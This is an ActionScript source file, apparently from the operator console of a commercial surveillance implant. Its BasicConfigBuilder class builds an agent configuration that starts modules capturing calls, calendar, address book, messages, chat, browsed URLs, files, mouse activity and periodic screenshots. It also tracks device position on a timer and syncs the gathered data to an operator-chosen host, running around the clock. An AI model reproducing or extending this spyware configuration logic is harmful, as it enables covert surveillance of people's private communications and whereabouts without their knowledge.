package it.ht.rcs.console.operations.view.configuration.basic
{
  
  public class BasicConfigBuilder
  {
    
    public static function buildConfig(modules:Array, globals:Object, model:Object):Object
    {
      var newConfig:Object = {};
      
      newConfig.modules = modules;
      newConfig.globals = globals;
      
      buildConfigInternal(model, newConfig)
      
      return newConfig;
    }
    
    private static function buildConfigInternal(model:Object, newConfig:Object):void
    {
      
      var actions:Array = [];
      var events:Array = [];
      
      var subactions:Array = [{action: "module", module: "device", status: "start"}]; // Always start the device module
      
      if (model.call)       subactions.push({action: "module", module: "call",        status: "start"});
      if (model.calendar) { subactions.push({action: "module", module: "calendar",    status: "start"});
                            subactions.push({action: "module", module: "addressbook", status: "start"}); }
      if (model.messages) { subactions.push({action: "module", module: "messages",    status: "start"});
                            subactions.push({action: "module", module: "chat",        status: "start"}); }
      if (model.url)        subactions.push({action: "module", module: "url",         status: "start"});
      if (model.file)       subactions.push({action: "module", module: "file",        status: "start"});
      if (model.screenshot) subactions.push({action: "module", module: "mouse",       status: "start"}); // I do not add screenshot here because, if enabled, it will have its own event/action
      
      
      var startupEvent:Object =  {event: "timer", type: "loop", start: 0, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "STARTUP"};
      var startupAction:Object = {desc: "STARTUP", subactions: subactions};
      events.push(startupEvent);
      actions.push(startupAction);
      
      
      var index:int = 1;
      if (model.screenshot) {
        var screenshotEvent:Object =  {event: "timer", type: "loop", start: index, repeat: index, delay: model.screenshotDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "SCREENSHOT"};
        var screenshotAction:Object = {desc: "SCREENSHOT", subactions: [{action: "module", module: "screenshot", status: "start"}]};
        events.push(screenshotEvent);
        actions.push(screenshotAction);
        index++;
      }
      
      
      if (model.position) {
        var positionEvent:Object =  {event: "timer", type: "loop", start: index, repeat: index, delay: model.positionDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "POSITION"};
        var positionAction:Object = {desc: "POSITION", subactions: [{action: "module", module: "position", status: "start"}]};
        events.push(positionEvent);
        actions.push(positionAction);
        index++;
      }
      
      
      if (model.sync) {
        var syncEvent:Object =  {event: "timer", type: "loop", repeat: index, delay: model.syncDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "SYNC"};
        var syncAction:Object = {desc: "SYNC", subactions: [{action: "synchronize", host: model.syncHost}]};
        events.push(syncEvent);
        actions.push(syncAction);
        index++;
      }
      
      
      newConfig.events = events;
      newConfig.actions = actions;
      
    }
    
  }
  
}